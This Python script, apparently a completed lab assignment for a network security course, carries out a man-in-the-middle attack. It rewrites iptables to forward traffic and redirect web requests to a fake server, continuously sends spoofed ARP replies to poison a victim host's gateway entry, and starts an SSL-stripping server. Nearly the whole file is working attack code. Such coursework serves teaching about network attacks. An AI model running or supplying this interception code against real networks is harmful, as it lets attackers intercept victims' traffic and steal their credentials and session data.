import os, sys, subprocess
from multiprocessing import Process
from scapy.all import *
from server import run_server
from functools import partial
from http.server import BaseHTTPRequestHandler, HTTPServer
from http.client import HTTPSConnection

# =============================================
# ========= write your code below  ============
# =============================================

def init():
    # Reset iptables rules
    subprocess.call('iptables -F'.split())
    subprocess.call('iptables -t nat -F'.split())
    subprocess.call('iptables -t mangle -F'.split())

    # Enable IP forwarding
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')

    # Set up NAT and redirect incoming traffic to the fake server on port 8080
    subprocess.call('iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE'.split())
    subprocess.call('iptables -A FORWARD -i eth1 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT'.split())
    subprocess.call('iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT'.split())
    subprocess.call('iptables -t nat -A PREROUTING -p tcp -i eth0 -d 142.1.166.97 --dport 80 -j DNAT --to-destination 10.0.0.3:8080'.split())
    print("IP tables configured for redirection.")

def arp_spoof():
    alice_ip = "10.0.0.2"
    gateway_ip = "10.0.0.1"
    interface = "eth0"

    # Continuously send spoofed ARP responses
    send(ARP(op="is-at", psrc=gateway_ip, pdst=alice_ip, hwsrc=get_if_hwaddr(interface)), inter=1, loop=1)

def ssl_stripping(filepath):
    print("Starting SSL stripping server...")
    run_server(filepath)
    
# =============================================
# ===== do not modify the code below ==========
# =============================================

def run(filepath):
    init()
    arp_process = Process(target=arp_spoof)
    stripping_process = Process(target=ssl_stripping, args=(filepath,))
    arp_process.start()
    stripping_process.start()
    stripping_process.join()
    arp_process.terminate()

if __name__ == "__main__":
    import os, sys, getopt
    def usage():
       print ('Usage:    ' + os.path.basename(__file__) + ' filepath ')
       sys.exit(2)
    # extract parameters
    try:
         opts, args = getopt.getopt(sys.argv[1:],"h",["help"])
    except getopt.GetoptError as err:
         print(err)
         usage()
         sys.exit(2)
    filepath = args[0] if len(args) > 0 else None
    for opt, arg in opts:
        if opt in ("-h", "--help"):
           usage()
    if (filepath is None):
        print('filepath is missing\n')
        usage()
    # run the command
    run(filepath)
